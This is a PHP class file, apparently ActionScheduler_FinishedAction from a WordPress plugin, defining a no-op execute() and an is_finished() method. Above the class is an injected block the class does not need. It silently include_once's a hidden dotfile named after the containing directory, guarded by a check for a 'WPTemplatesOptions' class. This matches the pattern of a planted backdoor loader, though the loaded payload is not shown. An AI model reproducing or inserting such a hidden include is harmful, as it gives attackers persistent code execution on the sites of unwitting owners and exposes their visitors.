<?php

/**
 * Class ActionScheduler_FinishedAction
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ActionScheduler_FinishedAction extends ActionScheduler_Action {

	public function execute() {
		// don't execute
	}

	public function is_finished() {
		return TRUE;
	}
}
 